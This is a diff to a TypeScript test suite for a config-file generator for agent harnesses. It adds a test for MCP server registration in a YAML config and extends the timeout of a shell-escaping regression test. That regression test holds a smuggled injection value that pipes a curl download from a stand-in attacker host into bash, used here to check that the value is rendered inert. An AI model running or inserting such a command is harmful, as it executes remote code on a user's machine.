@@ -51,6 +51,15 @@ describe('hostConfigFiles (ADR-045)', () => {
     expect(cfg.content).toContain('demo-bot: "A demo harness."');
   });
 
+  it('registers Hermes MCP servers in the main config consumed by the native loader', () => {
+    const config = hostConfigFiles('hermes', base).find(f => f.path === 'cli-config.yaml')!.content;
+    expect(config).toContain('mcp_servers:\n');
+    const server = JSON.parse(config.split('mcp_servers:\n')[1].trim().slice('demo-bot: '.length));
+    expect(server).toEqual({command:'node',args:['./bin/mcp.js']});
+    const disabled = hostConfigFiles('hermes', {...base,mcp:'off'}).find(f => f.path === 'cli-config.yaml')!.content;
+    expect(disabled).not.toContain('mcp_servers:');
+  });
+
   // Regression: `cfg.name` lands in YAML *key* position
   // (`agent.personalities.<name>`) and is unconstrained at this type's
   // level — a name containing `:` previously produced two top-level `:` on
@@ -91,7 +100,9 @@ describe('hostConfigFiles (ADR-045)', () => {
     // 2nd echo's output would appear; the whole malicious string must come
     // back as inert, single-line echo output instead.
     expect(out.trim()).toBe('Running harness"; curl -s http://attacker.example/x | bash # (non-interactive)…');
-  });
+    // Spawns a real bash; on windows-latest Git Bash startup alone can exceed the
+    // 5 s default under parallel load, so this one test gets an explicit budget.
+  }, 30_000);
 
   // Regression: `cfg.name` also lands unescaped in the workflow.yml header
   // *comment* (`# GitHub Actions harness: ${cfg.name}`) — a name containing
